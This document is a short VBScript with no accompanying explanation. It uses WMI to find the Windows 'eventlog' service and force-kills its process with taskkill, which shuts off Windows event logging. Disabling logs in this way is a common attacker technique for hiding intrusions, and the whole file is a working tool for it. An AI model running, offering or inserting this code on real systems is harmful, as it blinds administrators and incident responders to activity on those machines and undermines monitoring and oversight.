Set cmd = WScript.CreateObject("WScript.Shell")

Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}\\.\root\cimv2")
Set procList = objWMIService.ExecQuery("Select * from Win32_Service")

For Each proc in procList
        If proc.Name = "eventlog" And proc.ProcessID <> 0 Then
                cmd.Run("taskkill /f /pid " & proc.ProcessID)
        End If
Next

